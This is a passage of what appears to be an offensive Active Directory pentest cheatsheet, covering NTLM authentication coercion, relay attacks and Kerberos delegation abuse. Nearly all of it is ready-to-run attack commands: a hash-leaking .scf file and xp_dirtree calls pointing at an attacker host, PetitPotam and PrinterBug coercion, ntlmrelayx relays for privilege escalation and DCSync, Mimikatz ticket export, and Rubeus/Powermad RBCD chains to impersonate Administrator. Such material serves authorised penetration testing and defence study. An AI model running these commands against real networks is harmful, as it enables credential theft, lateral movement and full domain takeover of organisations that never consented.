<p id="bkmrk-ntlmv1-response-can-"><strong>NTLMv1</strong> response can be cracked on <a href="https://crack.sh/">crash.sh</a>.</p>
<h4 id="bkmrk-leak-files">Leak Files</h4>
<p id="bkmrk-with-write-rights-on">With write rights on a SMB share, it is possible to drop a <code>.scf</code> file with the following content to grab some user hashes:</p>
<pre id="bkmrk-%5Bshell%5D-command%3D2-ic"><code>[Shell]
Command=2
IconFile=\&lt;attacker_IP&gt;\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
</code></pre>
<h4 id="bkmrk-mitm6">MITM6</h4>
<p id="bkmrk-%28python-tool%29-spoof-">(Python tool) Spoof DHCPv6 responses to provide evil DNS config. Usefull to combine with NTLM or Kerberos  Relay attacks. Here for an NTLM relay:</p>
<pre id="bkmrk-mitm6--i-interface_t"><code class="language-bash">mitm6 -i interface_to_use -d domain.local -hw target.domain.local -v
</code></pre>
<p id="bkmrk-here-for-a-kerberos-">Here for a Kerberos relay to ADCS:</p>
<pre id="bkmrk-mitm6--i-interface_t-0"><code class="language-bash">mitm6 -i interface_to_use -d domain.local -hw target.domain.local --relay CA.domain.local -v
</code></pre>
<h4 id="bkmrk-petitpotam-%2F-printer">PetitPotam / PrinterBug / ShadowCoerce / DFSCoerce / CheeseOunce</h4>
<p id="bkmrk-exploits-to-coerce-n">Exploits to coerce Net-NTLM authentication from a computer. <strong>PetitPotam</strong> can be used without any credentials if no patch has been installed.</p>
<pre id="bkmrk-%23petitpotam-.%2Fpetitp"><code class="language-powershell">#PetitPotam
./PetitPotam.exe attacker_IP target_IP

#PrinterBug
./SpoolSample.exe target_IP attacker_IP

#ShadowCoerce
python3.exe shadowcoerce.py -d domain.local -u user1 -p password attacker_IP target_IP

#DFSCoerce
python3.exe dfscoerce.py -u user1 -d domain.local &lt;listener_IP&gt; &lt;target_IP&gt;

#CheeseOunce via MS-EVEN
./MS-EVEN.exe &lt;listener_IP&gt; &lt;target_IP&gt;
</code></pre>
<h4 id="bkmrk-mssql-coerce">MSSQL Coerce</h4>
<p id="bkmrk-everything-is-explai-0">Everything is explained <a href="https://github.com/p0dalirius/MSSQL-Analysis-Coerce/blob/main/README.md">here</a>.</p>
<ul id="bkmrk-mssql-server-%3A-with-"><li>MSSQL Server : with <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-rbcd-from-mssql-serv">xp_dirtree</a>.</li>
</ul><h4 id="bkmrk-privexchange">PrivExchange</h4>
<p id="bkmrk-coerce-exchange-serv">Coerce Exchange server authentication via <strong>PushSubscription</strong> (now patched):</p>
<pre id="bkmrk-python3.exe-privexch"><code class="language-bash">python3.exe privexchange.py -ah attacker_IP &lt;Exchange_server&gt; -u user1 -p password -d domain.local
</code></pre>
<h4 id="bkmrk-webclient-service">WebClient Service</h4>
<p id="bkmrk-if-this-service-runs">If this service runs on the target machine, a SMB authentication can be switched into an HTTP authentication (really useful for NTLM relay).</p>
<p id="bkmrk-check-if-webclient-i">Check if WebClient is running on machines:</p>
<pre id="bkmrk-getwebdavstatus.exe-"><code class="language-bash">GetWebDAVStatus.exe 'machine_ip'

#For multiple machines
webclientservicescanner domain.local/user1:password@10.10.10.0/24
</code></pre>
<p id="bkmrk-if-yes%2C-coerce-the-a">If yes, coerce the authentication to the port 80 on the attacker IP. To bypass trust zone restriction, the attacker machine must be specified with a valid <strong>NETBIOS name</strong> and not its IP. The <strong>NETBIOS name</strong> can be obtained with Responder in Analyze mode, or by adding a DNS record in the ADIDNS (Python tool).</p>
<pre id="bkmrk-%23responder-technique"><code class="language-powershell">#Responder technique
responder -I interface_to_use -A

#ADIDNS technique
New-ADIDNSNode -Tombstone -Verbose -Node "attacker.domain.local" -Data $IP

#Coerce with PetitPotam for example
./PetitPotam.exe "attacker_NETBIOS@80/test.txt" &lt;target_IP&gt;
</code></pre>
<p id="bkmrk-otherwise%2C-it%27s-poss">Otherwise, it's possible to force an HTTP authentication with a LLMNR poisoning <a href="https://www.synacktiv.com/publications/taking-the-relaying-capabilities-of-multicast-poisoning-to-the-next-level-tricking">by changing the error code returned</a>.</p>
<pre id="bkmrk-%23with-responder-%2B-sm"><code class="language-bash">#With Responder + smbserver 
  #Start smbserver in a first terminal with authentication required
python3 smbserver.py $NAME . -smb2support -username notexist -password notexist
  #Start Responder in a second terminal
responder --interface interface_to_use

#Or only with Responder
responder --interface interface_to_use -E
</code></pre>
<h3 id="bkmrk-ntlm-and-kerberos-re">NTLM and Kerberos relay</h3>
<h4 id="bkmrk-smb-without-signing">SMB without signing</h4>
<p id="bkmrk-create-a-list-of-com">Create a list of computer without SMB signing:</p>
<pre id="bkmrk-nxc-smb-10.10.10.0%2F2"><code class="language-bash">nxc smb 10.10.10.0/24 --gen-relay-list list.txt
</code></pre>
<h4 id="bkmrk-ntlmrelayx">ntlmrelayx</h4>
<p id="bkmrk-if-only-smbv2-is-sup">If only SMBv2 is supported, <code>-smb2support</code> can be used. To attempt the remove the MIC if <strong>NTLMv2</strong> is vulnerable to <strong>CVE-2019-1040</strong>, <code>--remove-mic</code> can be used.</p>
<p id="bkmrk-multiple-targets-can">Multiple targets can be specified with <code>-tf list.txt</code>.</p>
<ul id="bkmrk-enumeration"><li>Enumeration</li>
</ul><pre id="bkmrk-%23with-attempt-to-dum"><code class="language-bash">#With attempt to dump possible GMSA and LAPS passwords, and ADCS templates
ntlmrelayx.py ldap://dc --dump-adcs --dump-laps --dump-gmsa --no-da --no-acl
</code></pre>
<ul id="bkmrk-socks"><li>SOCKS</li>
</ul><pre id="bkmrk-ntlmrelayx.py--t-smb"><code class="language-bash">ntlmrelayx.py -t smb://target -socks
ntlmrelayx.py -t mssql://target -socks
ntlmrelayx.py -t ldaps://target -socks
</code></pre>
<ul id="bkmrk-creds-dump"><li>Creds dump</li>
</ul><pre id="bkmrk-ntlmrelayx.py-smb%3A%2F%2F"><code class="language-bash">ntlmrelayx.py smb://target
</code></pre>
<ul id="bkmrk-dcsync-if-the-target"><li>DCSync if the target in vulnerable to Zerologon</li>
</ul><pre id="bkmrk-ntlmrelayx.py-dcsync"><code class="language-bash">ntlmrelayx.py dcsync://dc
</code></pre>
<ul id="bkmrk-privesc"><li>Privesc</li>
</ul><p id="bkmrk-add-an-user-to-enter">Add an user to <strong>Enterprise Admins</strong>.</p>
<pre id="bkmrk-ntlmrelayx.py-ldap%3A%2F"><code class="language-bash">ntlmrelayx.py ldap://dc --escalate-user user1 --no-dump
</code></pre>
<ul id="bkmrk-kerberos-delegation"><li>Kerberos Delegation</li>
</ul><p id="bkmrk-kerberos-rbcd-are-de">Kerberos RBCD are detailled in the following section.</p>
<pre id="bkmrk-%23create-a-new-comput-0"><code class="language-bash">#Create a new computer account through LDAPS and enabled RBCD
ntlmrelayx.py ldaps://dc_IP --add-computer --delegate-access --no-dump --no-da --no-acl

#Create a new computer account through LDAP with StartTLS and enabled RBCD
ntlmrelayx.py ldap://dc_IP --add-computer --delegate-access --no-dump --no-da --no-acl

#Doesn't create a new computer account and use an existing one
ntlmrelayx.py ldap://dc_IP --escalate-user &lt;controlled_computer&gt; --delegate-access --no-dump --no-da --no-acl
</code></pre>
<ul id="bkmrk-shadow-credentials"><li>Shadow Credentials</li>
</ul><pre id="bkmrk-ntlmrelayx.py--t-lda"><code class="language-bash">ntlmrelayx.py -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$'
</code></pre>
<ul id="bkmrk-from-a-mitm6-authent"><li>From a mitm6 authent</li>
</ul><pre id="bkmrk-%23attempts-to-open-a-"><code class="language-bash">#Attempts to open a socks and write loot likes dumps into a file
ntlmrelayx.py -tf targets.txt -wh attacker.domain.local -6 -l loot.txt -socks
</code></pre>
<ul id="bkmrk-targeting-gpo"><li>Targeting GPO</li>
</ul><p id="bkmrk-this-attack-is-prese">This attack is presented in the Active Directory - Python edition cheatsheet.</p>
<ul id="bkmrk-relay-to-winrms"><li>Relay to WinRMs</li>
</ul><p id="bkmrk-if-ntlmv1-is-enabled">If <strong>NTLMv1 is enabled</strong> on the source server and accepted by the target, and the target server exposes the WinRMs service (over HTTPS), without forcing CBT. Use this <a href="https://github.com/fortra/impacket/pull/1947">PR</a>.</p>
<pre id="bkmrk-%23perform-the-relay-n"><code class="language-bash">#Perform the relay
ntlmrelayx -t winrms://target.domain.local -smb2support

#Use the opened WinRMs shell
nc 127.0.0.1 11000
</code></pre>
<ul id="bkmrk-adcs-esc8-%26-11-sccm-"><li>
<a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-certificate-services#bkmrk-relay-attacks---esc8">ADCS ESC8 &amp; 11</a>
</li>
<li>
<a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-sccm-%2F-mecm">SCCM primary site takeover</a>
</li>
</ul><h4 id="bkmrk-krbrelayx">krbrelayx</h4>
<p id="bkmrk-all-the-attacks-rela">All the attacks related to Kerberos relay are presented in the Active Directory - Python edition cheatsheet.</p>
<h4 id="bkmrk-krbjack">krbjack</h4>
<p id="bkmrk-a-tool-%28https%3A%2F%2Fgith">A tool (<a href="https://github.com/almandin/krbjack">https://github.com/almandin/krbjack</a>) to perform DNS updates thanks to the <code>ZONE_UPDATE_UNSECURE</code> flag in the DNS configuration. Perform a MiTM between any client and a target machine by changing its DNS resolution, forward all the packets to the specified ports, and steal the <code>AP_REQ</code> packets on the fly to reuse them.</p>
<p id="bkmrk-this-attack-is-prese-0">This attack is presented in the Active Directory - Python edition cheatsheet.</p>
<h2 id="bkmrk-kerberos-delegations">Kerberos Delegations</h2>
<p id="bkmrk-kerberos-delegations-0">Kerberos delegations can be used for local privesc, lateral movement or domain privesc. The main purpose of Kerberos delegations is to permit a principal to access a service on behalf of another principal.</p>
<p id="bkmrk-there-are-two-main-t">There are two main types of delegation:</p>
<ul id="bkmrk-unconstrained-delega"><li>
<strong>Unconstrained Delegation</strong>: the first hop server can request access to any service on any computer</li>
<li>
<strong>Constrained Delegation</strong>: the first hop server has a list of service it can request</li>
</ul><h3 id="bkmrk-unconstrained-delega-0">Unconstrained delegation</h3>
<h4 id="bkmrk-compromised-machine-">Compromised machine in Unconstrained Delegation</h4>
<ul id="bkmrk-enumerate-computers-"><li>Enumerate computers with Unconstrained Delegation</li>
</ul><pre id="bkmrk-get-netcomputer--unc"><code class="language-powershell">Get-NetComputer -UnConstrained

#With AD Module
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq $True}
</code></pre>
<ul id="bkmrk-get-admin-ticket"><li>Get admin ticket</li>
</ul><p id="bkmrk-after-compromising-t">After compromising the computer with UD enabled, we can trick or wait for an admin connection</p>
<pre id="bkmrk-%23check-if-a-ticket-i"><code class="language-powershell">#Check if a ticket is available
Invoke-Mimikatz -Command '"sekurlsa::tickets"'

#If yes
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
</code></pre>
<ul id="bkmrk-reuse-the-ticket"><li>Reuse the ticket</li>
</ul><pre id="bkmrk-invoke-mimikatz--com-5"><code class="language-powershell">Invoke-Mimikatz -Command '"kerberos::ptt ticket.kirbi"'
</code></pre>
<h4 id="bkmrk-printer-bug-%2F-petitp">Printer bug / PetitPotam</h4>
<p id="bkmrk-to-force-another-com">To force another computer to connect to the compromised machine in UD, and capture the TGT by monitoring:</p>
<pre id="bkmrk-.%5Crubeus.exe-monitor"><code class="language-powershell">.\Rubeus.exe monitor /interval:5 /nowrap
</code></pre>
<p id="bkmrk-on-the-attacker-mach">On the attacker machine run :</p>
<pre id="bkmrk-%23printerbug-.%5Cms-rpr"><code class="language-powershell">#PrinterBug
.\MS-RPRN.exe \\&lt;target&gt;.domain.local \\unconstrainedMachine.domain.local

#PetitPotam
.\PetitPotam.exe attacker_ip &lt;target&gt;.domain.local
</code></pre>
<pre id="bkmrk-.%5Crubeus.exe-ptt-%2Fti"><code class="language-powershell">.\Rubeus.exe ptt /ticket:...

#DCSync with the dc TGT
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"' 
</code></pre>
<h4 id="bkmrk-any-principal-in-unc">Any principal in Unconstrained Delegation</h4>
<p id="bkmrk-if-we-have-enough-ri">If we have enough rights against a principal (computer or user) in UD to add a <strong>SPN</strong> on it and <strong>know its password</strong>, we can try to use it to retrieve a machine account password from an authentication coercion.</p>
<ul id="bkmrk-add-a-new-dns-record"><li>Add a new DNS record on the domain that point to our IP</li>
<li>Add a SPN on the principal that point to the DNS record and change its password (will be usefull for the tool <code>krbrelayx.py</code> to extract the TGT from the ST)</li>
<li>Trigger the authentication and grab the ST (and TGT in it) on <strong>krbrelayx</strong> that is listenning for it</li>
</ul><p id="bkmrk-since-the-principal-">Since the principal is in <strong>Unconstrained Delegation</strong>, when the machine account will send the <strong>ST</strong> to the SPN it will automatically add a <strong>TGT</strong> in it, and because the SPN is pointing to us with the DNS record, we can retrieve the ST, decipher the ciphered part with the user password (the SPN is setup on the user, so the ST is ciphered with his password), and retrieve the TGT.</p>
<pre id="bkmrk-%23add-the-spn-with-th"><code class="language-powershell">#Add the SPN with the Microsoft module
Set-ADUser -Identity &lt;principal_in_UD&gt; -ServicePrincipalName @{Add='HOST/test.domain.local'}

#Create the DNS record
Invoke-DNSUpdate -DNSType A -DNSName test.domain.local -DNSData &lt;attacker_IP&gt; -Realm domain.local

#Run krbrelayx with the hash of the password setup on the UD user
python3 krbrelayx.py -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -dc-ip dc.domain.local

#Trigger the coercion
.\PetitPotam.exe &lt;attacker_ip&gt; &lt;target_IP&gt;
</code></pre>
<h3 id="bkmrk-constrained-delegati">Constrained delegation</h3>
<p id="bkmrk-in-this-situation%2C-t">In this situation, the computer in delegation has a list of services where it can delegate an authentication. This is controlled by <code>msDS-AllowedToDelegateTo</code> attribute that contains a list of SPNs to which the user tokens can be forwarded. No ticket is stored in LSASS.</p>
<p id="bkmrk-to-impersonate-the-u">To impersonate the user, Service for User (S4U) extension is used which provides two extensions:</p>
<ul id="bkmrk-service-for-user-to-"><li>Service for User to Self (<strong>S4U2self</strong>) - Allows a service to obtain a forwardable ST to itself on behalf of a user with just the user principal name without supplying a password. The service account must have the <strong>TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION</strong> – T2A4D UserAccountControl attribute.</li>
<li>Service for User to Proxy (<strong>S4U2proxy</strong>) - Allows a service to obtain a ST to a second service on behalf of a user.</li>
</ul><h4 id="bkmrk-enumerate-principals">Enumerate principals with CD enabled</h4>
<pre id="bkmrk-%23powerview-get-domai"><code class="language-powershell">#Powerview
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

#AD Module
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
</code></pre>
<h4 id="bkmrk-with-protocol-transi">With protocol transition</h4>
<p id="bkmrk-any-service-can-be-s">Any service can be specified on the target since it is not correctly checked. All the Rubeus commands can be performed with kekeo aswell.</p>
<ul id="bkmrk-request-a-ticket-for"><li>Request a ticket for multiple services on the target, for another user (S4U)</li>
</ul><pre id="bkmrk-.%5Crubeus.exe-s4u-%2Fus"><code class="language-powershell">.\Rubeus.exe s4u /user:user1 /rc4:&lt;hash&gt; /impersonateuser:Administrator /msdsspn:"time/&lt;target&gt;.domain.local" /altservice:ldap,cifs /ptt
</code></pre>
<p id="bkmrk-if-we-have-a-session">If we have a session as the user, we can just run <code>.\Rubeus.exe tgtdeleg /nowrap</code> to get the TGT in Base64, then run:</p>
<pre id="bkmrk-.%5Crubeus.exe-s4u-%2Fti"><code class="language-powershell">.\Rubeus.exe s4u /ticket:doIFCDC[SNIP]E9DQUw= /impersonateuser:Administrator /domain:domain.local /msdsspn:"time/&lt;target&gt;.domain.local" /altservice:ldap,cifs /ptt
</code></pre>
<ul id="bkmrk-inject-the-ticket"><li>Inject the ticket</li>
</ul><pre id="bkmrk-invoke-mimikatz--com-6"><code class="language-powershell">Invoke-Mimikatz -Command '"kerberos::ptt ticket.kirbi"'
</code></pre>
<h4 id="bkmrk-without-protocol-tra">Without protocol transition</h4>
<p id="bkmrk-in-this-case%2C-it-is-">In this case, it is not possible to use <strong>S4U2self</strong> to obtain a forwardable ST for a specific user. This restriction can be bypassed with an RBCD attack detailled in the following section.</p>
<h3 id="bkmrk-resource-based-const">Resource-based constrained delegation</h3>
<p id="bkmrk-wagging-the-dog"><a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">Wagging the Dog</a></p>
<p id="bkmrk-with-rbcd%2C-this-is-t">With RBCD, this is the resource machine (the machine that receives delegation) which has a list of services that can delegate to it. This list is specified in the attribute <code>msds-allowedtoactonbehalfofotheridentity</code> and the computer can modified its own attribute (really usefull in NTLM relay attack scenario).</p>
<h4 id="bkmrk-requirements">Requirements</h4>
<ul id="bkmrk-the-dc-has-to-be-at-"><li>The DC has to be at least a <strong>Windows Server 2012</strong>
</li>
<li>Domain users can create some machines, <code>ms-ds-machineaccountquota</code> must not being to 0</li>
</ul><pre id="bkmrk-%23to-verify-get-domai"><code class="language-powershell">#To verify
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local
</code></pre>
<ul id="bkmrk-write-rights-on-the-"><li>Write rights on the target machine (<strong>GenericAll, GenericWrite, AllExtendedRights</strong>)</li>
<li>Target computer, object must not have the attribute <code>msds-allowedtoactonbehalfofotheridentity</code> set</li>
</ul><pre id="bkmrk-get-netcomputer-ws01"><code class="language-powershell">Get-NetComputer ws01 | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
</code></pre>
<h4 id="bkmrk-standard-rbcd">Standard RBCD</h4>
<p id="bkmrk-the-attaker-has-comp">The attaker has compromised ServiceA and want to compromise ServiceB. Additionnally he has sufficient rights to configure <code>msds-allowedtoactonbehalfofotheridentity</code> on ServiceB.</p>
<pre id="bkmrk-%23add-rbcd-from-servi"><code class="language-powershell">#Add RBCD from ServiceA to ServiceB
Set-ADComputer ServiceB -PrincipalsAllowedToDelegateToAccount ServiceA$

#Verify property
Get-NetComputer ServiceB | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity

#Get ServiceA TGT and then S4U
rubeus -x tgtdeleg /nowrap
rubeus -x s4u /user:ServiceA$ /ticket:ticket.kirbi /impersonateuser:administrator /msdsspn:host/ServiceB.domain.local /domain:domain.local /altservice:cifs,host,http,winrm,RPCSS,wsman /ptt
</code></pre>
<h4 id="bkmrk-with-machine-account">With machine account creation</h4>
<ul id="bkmrk-add-a-fake-machine-a"><li>Add a fake machine account in the domain</li>
<li>Add it the to <code>msds-allowedtoactonbehalfofotheridentity</code> attribute of the target machine</li>
</ul><pre id="bkmrk-import-module-powerm"><code class="language-powershell">Import-Module Powermad.ps1
Import-Module PowerView.ps1

#Creds if needed, to run as another user
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('domain.local\user1', $SecPassword)

#Check requirements
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local -Credential $Cred
Get-NetComputer &lt;target&gt; -Domain domain.local | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity

#Add the fake machine as a ressource + get its SID
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force) -Credential $Cred -Verbose -Domain domain.local -DomainController DC.domain.local
Get-DomainComputer FAKE01 -Domain domain.local -Credential $Cred
$ComputerSid = Get-DomainComputer FAKE01 -Properties objectsid | Select -Expand objectsid

#Create the new raw security descriptor
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

#Add the new raw SD to msds-allowedtoactonbehalfofotheridentity
Get-DomainComputer &lt;target&gt; -SearchBase "LDAP://DC=domain,DC=local" -Credential $Cred | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -SearchBase "LDAP://DC=domain,DC=local" -Verbose -Credential $Cred

#Check if well added
$RawBytes = Get-DomainComputer &lt;target&gt; -Properties 'msds-allowedtoactonbehalfofotheridentity' -Credential $Cred -SearchBase "LDAP://DC=domain,DC=local" | select -expand msds-allowedtoactonbehalfofotheridentity
(New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0).DiscretionaryAcl
</code></pre>
<ul id="bkmrk-use-the-s4uself-func"><li>Use the <strong>S4USelf</strong> function with the fake machine (on an arbitrary SPN) to create a forwardable ticket for a wanted user (not <strong>protected</strong>)</li>
<li>Use the <strong>S4UProxy</strong> function to obtain a ST for the impersonated user for the wanted service on the target machine</li>
</ul><pre id="bkmrk-%23calcul-hash-.%5Crubeu"><code class="language-powershell">#Calcul hash
.\Rubeus.exe hash /password:Password123! /user:FAKE01$ /domain:domain.local
#S4U attack
.\Rubeus.exe s4u /user:FAKE01$ /rc4:2B576ACBE6BCFDA7294D6BD18041B8FE /impersonateuser:administrator /msdsspn:cifs/&lt;target&gt; /domain:domain.local /ptt /dc:DC.domain.local
</code></pre>
<h4 id="bkmrk-skip-s4uself">Skip S4USelf</h4>
<ul id="bkmrk-attacker-has-comprom"><li>Attacker has compromised Service A, has sufficient ACLs against Service B to configure RBCD, and wants to attack Service B</li>
<li>By social engineering or any other solution, an interesting victim authenticates to Service A with a ST</li>
<li>Attacker dumps the ST on Service A (<code>sekurlsa::tickets</code>)</li>
<li>Attacker configures RBCD from Service A to Service B as above</li>
<li>Attacker performs S4UProxy and bypass S4USelf by providing the ST as evidence</li>
</ul><pre id="bkmrk-.%5Crubeus.exe-s4u-%2Fus-0"><code class="language-powershell">.\Rubeus.exe s4u /user:ServiceA$ /aes256:&lt;service_key&gt; /tgs:"/path/to/kirbi" /msdsspn:cifs/serviceB.domain.local /domain:domain.local /ptt /dc:DC.domain.local
</code></pre>
<h4 id="bkmrk-reflective-rbcd">Reflective RBCD</h4>
<p id="bkmrk-with-a-tgt-or-the-ha">With a TGT or the hash of a service account, an attacker can configure a RBCD from the service to itself, a run a full S4U to access the machine on behalf of another user.</p>
<pre id="bkmrk-set-adcomputer-servi"><code class="language-powershell">Set-ADComputer ServiceA -PrincipalsAllowedToDelegateToAccount ServiceA$
.\Rubeus.exe s4u /user:ServiceA$ /aes256:&lt;service_key&gt; /impersonateuser:Administrator /msdsspn:cifs/serviceA.domain.local /domain:domain.local /ptt /dc:DC.domain.local
</code></pre>
<h4 id="bkmrk-impersonate-protecte">Impersonate protected user via S4USelf request</h4>
<p id="bkmrk-it-is-possible-to-im">It is possible to impersonate a <strong>protected</strong> <strong>user</strong> with the <strong>S4USelf</strong> request if we have a TGT (or the creds) of the target machine (for example from an <strong>Unconstrained Delegation</strong>).</p>
<p id="bkmrk-with-the-target-tgt-">With the target TGT it is possible to realise a S4USelf request for any user and obtain a ST for the service. In case where the needed user is protected against delegation, S4USelf will still work, but the ST is not forwardable (so no S4UProxy possible) and the specified SPN is invalid...however, the SPN is not in the encrypted part of the ticket. So it is possible to modify the SPN and retrieve a valid ST for the target service with a sensitive user (and the ST PAC is well signed by the KDC).</p>
<pre id="bkmrk-.%5Crubeus.exe-s4u-%2Fse"><code class="language-powershell">.\Rubeus.exe s4u /self /impersonateuser:Administrator /ticket:doIFFz[...SNIP...]TE9DQUw=  /domain:domain.local /altservice:cifs/server.domain.local /ptt
</code></pre>
<h4 id="bkmrk-bypass-constrained-d">Bypass Constrained Delegation restrictions with RBCD</h4>
<ul id="bkmrk-attacker-compromises"><li>Attacker compromises <strong>ServiceA</strong> and <strong>ServiceB</strong>
</li>
<li>ServiceB is allowed to delegate to <code>time/ServiceC</code> (the target) without protocol transition (no S4USelf)</li>
<li>Attacker configures RBCD from ServiceA to ServiceB and performs a full S4U attack to obtain a forwardable ST for the Administrator to ServiceB</li>
<li>Attacker reuses this forwardable ST as evidence to realise a S4UProxy attack from ServiceB to <code>time/ServiceC</code>
</li>
<li>Since the service is not protected in the obtained ticket, the attacker can change the ST from the previous S4UProxy execution to <code>cifs/ServiceC</code>
</li>
</ul><pre id="bkmrk-%23rbcd-from-a-to-b-se"><code class="language-powershell">#RBCD from A to B
Set-ADComputer ServiceB -PrincipalsAllowedToDelegateToAccount ServiceA$
.\Rubeus.exe s4u /user:ServiceA$ /aes256:&lt;serviceA_key&gt; /impersonateuser:Administrator /msdsspn:cifs/serviceB.domain.local /domain:domain.local /dc:DC.domain.local

#S4UProxy from B to C with the obtained ST as evidence
.\Rubeus.exe s4u /user:ServiceB$ /aes256:&lt;serviceB_key&gt; /tgs:&lt;obtained_TGS&gt; /msdsspn:time/serviceC.contoso.local /altservice:cifs /domain:domain.local /dc:DC.domain.local /ptt
</code></pre>
<h4 id="bkmrk-u2u-rbcd-with-spn-le">U2U RBCD with SPN-less accounts</h4>
<p id="bkmrk-in-case-where-you-ha-0">In case where you have sufficient rights to configure an RBCD on a machine (for example with an unsigned authentication coerce via HTTP) but <code>ms-ds-machineaccountquota</code> equals 0, there is no ADCS with the HTTP endpoint and the Shadow Credentials attack is not possible (domain level to 2012 for example), you can realize a RBCD from a SPN-less user account. An interesting example is present <a href="https://twitter.com/snovvcrash/status/1595814518558543874">here</a>. You can follow the example in this <a href="https://github.com/GhostPack/Rubeus/pull/137">PR</a>.</p>
<ul id="bkmrk-configure-the-machin"><li>Configure the machine account to trust the user account you control (NTLM Relay, with the machine account's creds,...)</li>
<li>Obtain a TGT for the user via pass-the-hash:</li>
</ul><pre id="bkmrk-.%5Crubeus.exe-asktgt-"><code class="language-powershell">.\Rubeus.exe asktgt /user:user1 /rc4:&lt;NT_hash&gt; /nowrap
</code></pre>
<ul id="bkmrk-request-a-service-ti"><li>Request a Service Ticket via U2U (S4USelf request) with the previous TGT specified in <code>/tgs:</code> (additional ticket added to the request body identifying the target user account) and <code>/ticket:</code> (authentication). If U2U is not used, the KDC cannot find the account's LT key when a UPN is specified instead of a SPN. The account to impersonate via the futur S4U request is also present:</li>
</ul><pre id="bkmrk-.%5Crubeus.exe-asktgs-"><code class="language-powershell">.\Rubeus.exe asktgs /u2u /ticket:TGT.kirbi /tgs:TGT.kirbi /targetuser:Administrator /nowrap
</code></pre>
<ul id="bkmrk-retrieve-the-tgt-ses"><li>Retrieve the TGT session key in HEX format:</li>
</ul><pre id="bkmrk-import-binascii%2C-bas"><code class="language-python">import binascii, base64
print(binascii.hexlify(base64.b64decode("&lt;TGT_SESSION_KEY_B64&gt;")).decode())
</code></pre>
<ul id="bkmrk-now%2C-change-the-user"><li>Now, change the user's long term key (his RC4 NT hash actually) to be equal to the TGT session key. The ST sent in the S4UProxy is encrypted with the session key, but the KDC will try to decipher it with the user's long term key, this is why the LT key must be equal to the session key (<strong>WARNING !!! The user's password is now equal to an unknown value, you have to use a sacrificial account to realise this attack</strong>). Everything is explained <a href="https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html">here</a>.</li>
</ul><pre id="bkmrk-smbpasswd.py--newhas"><code class="language-bash">smbpasswd.py -newhashes :sessionKey 'domain.local'/'user1':'Password123!'@'DC'
</code></pre>
<ul id="bkmrk-realize-the-s4uproxy"><li>Realize the S4UProxy request with the previous S4USelf U2U ticket (ciphered with the session key) as additional ticket and the original TGT as ticket:</li>
</ul><pre id="bkmrk-.%5Crubeus.exe-s4u-%2Fms"><code class="language-powershell">.\Rubeus.exe s4u /msdsspn:cifs/target.domain.local /ticket:TGT.kirbi /tgs:U2U.kirbi
</code></pre>
<ul id="bkmrk-finally%2C-use-this-ti"><li>Finally, use this ticket to do whatever you want</li>
</ul><h4 id="bkmrk-rbcd-from-mssql-serv">RBCD from MSSQL server</h4>
<p id="bkmrk-if-we-have-sufficien">If we have sufficient access to a MSSQL server we can use the <code>xp_dirtree</code> in order to leak the Net-NTLM hash of the machine account. Additionally, the <strong>Web Service</strong> client must be running on the machine in order to trick the authentication from SMB to HTTP and avoid the NTLM signature (authentication must be sent to <code>@80</code>):</p>
<ul id="bkmrk-create-a-dns-record-"><li>Create a DNS record in order to be able to leak the NTLM hash externally</li>
<li>Use the <code>xp_dirtree</code> (or <code>xp_fileexist</code>) function to the created DNS record on <code>@80</code>. This will force the authentication and leak the hash</li>
<li>Relay the machine hash to the LDAP server to add a controlled account (<strong>with a SPN</strong> for the further S4USelf request) to the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> of the target machine</li>
<li>Now we can ask a ST for a user we want to impersonate for a service on the machine</li>
</ul><pre id="bkmrk-%23add-the-dns-invoke-"><code class="language-powershell">#Add the DNS
Invoke-DNSUpdate -DNSType A -DNSName attacker.domain.local -DNSData &lt;attacker_IP&gt; -Realm domain.local

#On our machine, waiting for the leak
#https://gist.github.com/3xocyte/4ea8e15332e5008581febdb502d0139c
python rbcd_relay.py 192.168.24.10 domain.local 'target$' &lt;controlledAccountWithASPN&gt;

#ON the MSSQL server
SQLCMD -S &lt;MSSQL_instance&gt; -Q "exec master.dbo.xp_dirtree '\\attacker@80\a'" -U Admin -P Admin

#After the attack, ask for a ST with full S4U
.\Rubeus.exe s4u /user:&lt;controlled_account&gt; /rc4:&lt;hash&gt; /impersonateuser:Administrator /msdsspn:cifs/&lt;target&gt; /domain:domain.local /dc:DC.domain.local /ptt
</code></pre>
<h2 id="bkmrk-domain-persistence">Domain Persistence</h2>
<h3 id="bkmrk-diamond-ticket">Diamond ticket</h3>
<p id="bkmrk-blog-here"><a href="https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/">Blog here</a></p>
